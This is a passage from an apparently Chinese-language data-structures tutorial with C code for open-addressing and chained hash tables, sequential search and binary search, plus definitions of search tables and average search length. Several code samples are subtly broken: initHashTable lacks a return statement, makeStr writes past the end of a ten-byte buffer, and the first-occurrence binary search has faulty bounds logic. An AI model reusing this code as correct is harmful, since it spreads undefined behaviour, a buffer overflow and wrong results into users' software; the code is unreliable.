&#123;<br>            *pos = (*pos + <span class="hljs-number">1</span>) % h-&gt;<span class="hljs-built_in">size</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (h-&gt;elem[*pos] != <span class="hljs-literal">NULL</span> &amp;&amp; <span class="hljs-built_in">strcmp</span>(h-&gt;elem[*pos], value) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insert</span><span class="hljs-params">(HashTable *h, <span class="hljs-keyword">char</span> value[])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> pos, times;<br>    <span class="hljs-comment">// pos在search函数结束时时待插入元素的位置，times为冲突计数</span><br>    <span class="hljs-keyword">if</span> (search(h, value, &amp;pos, &amp;times)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (times &lt; h-&gt;<span class="hljs-built_in">size</span> / <span class="hljs-number">2</span>) &#123;<br>        h-&gt;elem[pos] = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(value) + <span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">strcpy</span>(h-&gt;elem[pos], value);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        recreate(h);<br>        insert(h, value);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 当插入值的冲突数大于size的一半时，增大哈希表。</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">recreate</span><span class="hljs-params">(HashTable *h)</span> </span>&#123;<br>    <span class="hljs-comment">// 获取原哈希表中元素</span><br>    <span class="hljs-keyword">char</span> **temp_elem;<br>    temp_elem = (<span class="hljs-keyword">char</span> **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *) * h-&gt;<span class="hljs-built_in">size</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; h-&gt;<span class="hljs-built_in">size</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (h-&gt;elem[i] != <span class="hljs-literal">NULL</span>) &#123;<br>            temp_elem[i] = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(h-&gt;elem[i]) + <span class="hljs-number">1</span>);<br>            <span class="hljs-built_in">strcpy</span>(temp_elem[i], h-&gt;elem[i]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            temp_elem[i] = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 释放原哈希表中元素</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; h-&gt;<span class="hljs-built_in">size</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (h-&gt;elem[i] != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">free</span>(h-&gt;elem[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(h-&gt;elem);<br>    <br>    <span class="hljs-comment">// 创建新哈希表</span><br>    <span class="hljs-keyword">int</span> copy_size = h-&gt;<span class="hljs-built_in">size</span>;<br>    h-&gt;<span class="hljs-built_in">size</span> = h-&gt;<span class="hljs-built_in">size</span> * <span class="hljs-number">2</span>;<br>    h-&gt;elem = (<span class="hljs-keyword">char</span> **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *) * h-&gt;<span class="hljs-built_in">size</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; h-&gt;<span class="hljs-built_in">size</span>; i++) &#123;<br>        h-&gt;elem[i] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; copy_size; i++) &#123;<br>        <span class="hljs-keyword">if</span> (temp_elem[i] != <span class="hljs-literal">NULL</span>) &#123;<br>            insert(h, temp_elem[i]);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 释放内存</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; copy_size; i++) &#123;<br>        <span class="hljs-keyword">if</span> (temp_elem[i] != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">free</span>(temp_elem[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(temp_elem);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(HashTable *h)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; h-&gt;<span class="hljs-built_in">size</span>; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (h-&gt;elem[i] != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">free</span>(h-&gt;elem[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(h-&gt;elem);<br>    <span class="hljs-built_in">free</span>(h);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    HashTable *hashtable = (HashTable*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(HashTable));<br>    init(hashtable);<br>    <span class="hljs-keyword">char</span> <span class="hljs-built_in">buffer</span>[<span class="hljs-number">1000</span>];<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, <span class="hljs-built_in">buffer</span>);<br>        <span class="hljs-keyword">int</span> ans = insert(hashtable, <span class="hljs-built_in">buffer</span>);<br>        <span class="hljs-keyword">if</span> (ans == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"recreate while insert!\n"</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ans == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"insert success!\n"</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ans == <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"It already exists!\n"</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">int</span> temp_pos, temp_times;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, <span class="hljs-built_in">buffer</span>);<br>    <span class="hljs-keyword">if</span> (search(hashtable, <span class="hljs-built_in">buffer</span>, &amp;temp_pos, &amp;temp_times)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"search success!\n"</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"search failed!\n"</span>);<br>    &#125;<br>    <span class="hljs-built_in">clear</span>(hashtable);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="实现链地址法">实现链地址法</span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">char</span> *str;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125; Node;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HashTable</span> &#123;</span><br>    Node **data;<br>    <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>;<br>&#125; HashTable;<br><br><span class="hljs-function">Node *<span class="hljs-title">initNode</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    Node *n = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br><br>    <span class="hljs-comment">//n-&gt;str = (char *)malloc(strlen(str) + 1);</span><br>    <span class="hljs-comment">//strcpy(n-&gt;str, str);</span><br>    <span class="hljs-comment">// 等价操作</span><br>    n-&gt;str = strdup(str);<br>    n-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeNode</span><span class="hljs-params">(Node *n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!n) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-built_in">free</span>(n-&gt;str);<br>    <span class="hljs-built_in">free</span>(n);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeList</span><span class="hljs-params">(Node *<span class="hljs-built_in">list</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">list</span>) <span class="hljs-keyword">return</span>;<br>    Node *n;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">list</span>) &#123;<br>        n = <span class="hljs-built_in">list</span>;<br>        <span class="hljs-built_in">list</span> = <span class="hljs-built_in">list</span>-&gt;next;<br>        freeNode(n);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function">HashTable *<span class="hljs-title">initHashTable</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>)</span> </span>&#123;<br>    HashTable *h = (HashTable *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(HashTable));<br>    h-&gt;<span class="hljs-built_in">size</span> = <span class="hljs-number">2</span> * <span class="hljs-built_in">size</span>;<br>    h-&gt;data = (Node **)<span class="hljs-built_in">calloc</span>(h-&gt;<span class="hljs-built_in">size</span>, <span class="hljs-keyword">sizeof</span>(Node*));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeHashTable</span><span class="hljs-params">(HashTable *h)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!h) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; h-&gt;<span class="hljs-built_in">size</span>; i++) &#123;<br>        freeList(h-&gt;data[i]);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(h-&gt;data);<br>    <span class="hljs-built_in">free</span>(h);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function">Node *<span class="hljs-title">insertNode</span><span class="hljs-params">(Node *head, Node *p)</span> </span>&#123;<br>    p-&gt;next = head;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">BKDHash</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> seed = <span class="hljs-number">11</span>; <span class="hljs-comment">// prime</span><br>    <span class="hljs-keyword">int</span> hash = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (*str) &#123;<br>        hash = hash * seed + str[<span class="hljs-number">0</span>];<br>        ++str;<br>    &#125;<br>    <span class="hljs-keyword">return</span> hash &amp; <span class="hljs-number">0x7fffffff</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">insertHash</span><span class="hljs-params">(HashTable *h, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> hash = BKDHash(str);<br>    <span class="hljs-keyword">int</span> idx = hash % h-&gt;<span class="hljs-built_in">size</span>;<br><br>    h-&gt;data[idx] = insertNode(h-&gt;data[idx], initNode(str));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function">Node *<span class="hljs-title">searchList</span><span class="hljs-params">(Node *p, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (p &amp;&amp; <span class="hljs-built_in">strcmp</span>(p-&gt;str, str)) &#123;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-function">Node *<span class="hljs-title">search</span><span class="hljs-params">(HashTable *h, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">int</span> hash = BKDHash(str);<br>    <span class="hljs-keyword">int</span> idx = hash % h-&gt;<span class="hljs-built_in">size</span>;<br><br>    <span class="hljs-keyword">return</span> searchList(h-&gt;data[idx], str);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">makeStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> len = rand() % (n - <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">char</span> tmp;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        <span class="hljs-keyword">switch</span> (rand() % <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                tmp = <span class="hljs-string">'A'</span> + rand() % <span class="hljs-number">26</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                tmp = <span class="hljs-string">'a'</span> + rand() % <span class="hljs-number">26</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                tmp = <span class="hljs-string">'0'</span> + rand() % <span class="hljs-number">10</span>;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>        str[i] = tmp;<br>    &#125;<br>    str[n] = <span class="hljs-string">'\0'</span>; <span class="hljs-comment">// or str[n] = 0;</span><br>    <span class="hljs-keyword">return</span> str;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    srand(time(<span class="hljs-literal">NULL</span>));<br><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> N 10</span><br>    <span class="hljs-keyword">char</span> str[<span class="hljs-number">10</span>];<br>    <span class="hljs-keyword">int</span> cnt = N;<br>    HashTable *h = initHashTable(N);<br><br>    <span class="hljs-keyword">while</span> (cnt--) &#123;<br>        insertHash(h, makeStr(str, <span class="hljs-number">10</span>));<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s "</span>, str);<br>    &#125;<br>    <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>); <span class="hljs-comment">// or putchar('\n');</span><br><br>    <span class="hljs-keyword">while</span> (~<span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, str)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(str, <span class="hljs-string">"q"</span>)) <span class="hljs-keyword">break</span>; <span class="hljs-comment">// q 退出</span><br>        Node *node = search(h, str);<br>        <span class="hljs-keyword">if</span> (node)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hash=%d addr=%p str=%s\n"</span>, BKDHash(str), node, node-&gt;str);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s not found\n"</span>, str);<br>    &#125;<br><br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> N</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="查找表">查找表</span></h2><p>用于查找的数据集合则称为 <strong>查找表（search table）</strong>。查找表中的数据元素类型是一致的，并且有能够唯一标识出元素的<strong>关键字（keyword）</strong> 。</p><p>通常对查找表有 4 种操作：</p><ol type="1"><li>查找：在查找表中查看某个特定的记录是否存在</li><li>检索：查找某个特定记录的各种属性</li><li>插入：将某个不存在的数据元素插入到查找表中</li><li>删除：从查找表中删除某个特定元素</li></ol><p>如果对查找表只执行前两种操作，则称这类查找表为<strong>静态查找表（static search table）</strong>。静态查找表建立以后，就不能再执行插入或删除操作，查找表也不再发生变化。比如顺序查找、折半查找、分块查找等。</p><p>对应的，如果对查找表还要执行后两种操作，则称这类查找表为<strong>动态查找表（dynamic search table）</strong>。对于动态查找表，往往使用二叉平衡树、B-树或哈希表来处理。</p><h3><span id="性能度量">性能度量</span></h3><p>使用 <strong>平均查找长度（average search length, ASL）</strong>来衡量查找算法的性能。</p><p>假设每个元素时等概率分布，ASL就是所有元素被成功查找时，元素比较次数的期望。</p><p>通常平均查找长度，不考虑查找不成功的情况。</p><h3><span id="顺序查找">顺序查找</span></h3><p><strong>顺序查找（又称线性查找，sequential search）</strong>是指在线性表中进行的查找算法。对于无序序列，查找成功的ASL为 <span class="math inline">\(\frac{n+1}{2}\)</span>。查找不成功ASL为 n。</p><p>对于有序序列，查找成功的ASL为 <span class="math inline">\(\frac{n+1}{2}\)</span>。查找不成功ASL为 <span class="math inline">\(\frac{n}{2} +\frac{n}{n+1}\)</span>。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (data[i] == value) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data[i] &gt; value) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> a[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, search(a, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, search(a, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="折半查找">折半查找</span></h3><p>针对有序可随机寻址的顺序表结构，查找时间复杂度稳定下降为 <span class="math inline">\(O(log(n))\)</span> 级别。</p><p>在定义端点下标时，决定了搜索区间的分布情况。右端定义为length -1，搜索区间为闭区间。右端收缩为 mid -1。右端定义为length，搜索区间为左闭右开，右端收缩为 mid。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>        <span class="hljs-keyword">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (data[mid] == value) &#123;<br>            <span class="hljs-keyword">return</span> mid;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data[mid] &lt; value) &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> a[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, search(a, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, search(a, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>搜索排好序的序列中某重复元素第一个出现位置的问题。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *data, <span class="hljs-keyword">int</span> length, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = length;  <span class="hljs-comment">// 处理不存在目标情况</span><br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-keyword">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (data[mid] == value) &#123;<br>            right = mid; <span class="hljs-comment">// 收缩到第一个出现位置</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            left = mid + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> right != length ? left : <span class="hljs-number">-1</span>; <span class="hljs-comment">// 处理不存在目标情况</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>搜索排好序的序列中某重复元素最后一个出现位置的问题。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span 